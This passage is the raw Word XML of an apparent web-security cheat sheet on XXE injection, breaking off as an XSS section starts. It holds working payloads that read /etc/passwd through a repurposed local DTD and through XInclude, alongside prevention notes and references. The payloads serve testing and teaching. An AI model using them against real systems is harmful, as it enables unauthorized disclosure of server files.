    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Reporposing</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> a local DTD</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>If external entity resolution is disabled, you may be able to redefine a custom entity within a local DTD on the target system</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Find a suitable local DTD file by searching for </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>*.</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>dtd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> files:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:shd w:val="solid" w:color="E2E2E2" w:fill="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t># This will issue an error if the local DTD does not exist</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>&lt;</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>!DOCTYPE</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> foo [</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">&lt;!ENTITY % </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>local_dtd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> SYSTEM "file:///usr/local/app/schema.dtd"&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>%</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>local_dtd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>]&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="20"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Redefine a custom entity within the loc</w:t>
      </w:r>
      <w:r>
        <w:t>al DTD:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:shd w:val="solid" w:color="E2E2E2" w:fill="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>&lt;!DOCTYPE foo [</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">&lt;!ENTITY % </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>local_dtd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> SYSTEM "file:///usr/local/app/schema.dtd"&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">&lt;!ENTITY % </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>custom_entity</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> '</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>&lt;!ENTITY &amp;#x25; file SYSTEM "file:///etc/passwd"&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">&lt;!ENTITY &amp;#x25; </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>eval</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> "&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;fil</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>e;&amp;#x27;&gt;"&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>&amp;#x25;eval;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>&amp;#x25;error;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>'&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>%</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>local_dtd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>]&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Finding XXE injection vulnerabilities</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>Requests contain XML data</w:t>
      </w:r>
      <w:r>
        <w:t>: these are obvious vectors for XXE attacks.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>XInclude</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t xml:space="preserve"> attacks</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: occur when the application includes your request in another XML document.  Since you do not control the entire document, a new </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>DOCTYPE</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> cannot be added.  However, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>XInclude</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> still allows for XXE:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:shd w:val="solid" w:color="E2E2E2" w:fill="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">&lt;foo </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>xmlns:xi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>="http://www.w3.org/2001/XInclude"&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>&lt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>xi</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>:include</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">parse="text" </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>href</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>="file:///etc/passwd"/&gt;&lt;/foo&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>File retrieval</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: test for </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>well known</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> OS file retrieval such as </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>etc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>passwd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>etc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>/hosts</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>Blind XXE to trigger SSRF</w:t>
      </w:r>
      <w:r>
        <w:t>: send requests to systems you control and watch for requests in the logs.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Prevent</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Disable as m</w:t>
      </w:r>
      <w:r>
        <w:t>any XML processing features as possible.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Usually disabling external entity resolution and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>XInclude</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> is enough.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Tools</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
      </w:pPr>
      <w:hyperlink r:id="rId40" w:history="1">
        <w:r>
          <w:rPr>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Burp Proxy</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
      </w:pPr>
      <w:hyperlink r:id="rId41" w:history="1">
        <w:r>
          <w:rPr>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Burp Repeater</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>References</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>https://portswigger.net/web-security/xxe</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>https://portswigger.net/web-security/xxe/blind</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
        <w:sectPr w:rsidR="00B3581B">
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="1440" w:right="1440" w:bottom="1440" w:left="1440" w:header="720" w:footer="720" w:gutter="0"/>
          <w:pgNumType w:start="1"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:t>https://portswigger.net/web-security/xxe/xml-enti</w:t>
      </w:r>
      <w:r>
        <w:t>ties</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Cross-site scripting (XSS</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>) :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>scissors:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>Allows an attacker to masquerade as a victim user and perform actions on their behalf.  Works by injecting malicious scripts into a website that execute in the victim's browser.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>To test for XSS, inject the JavaScr</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ipt </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>alert(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
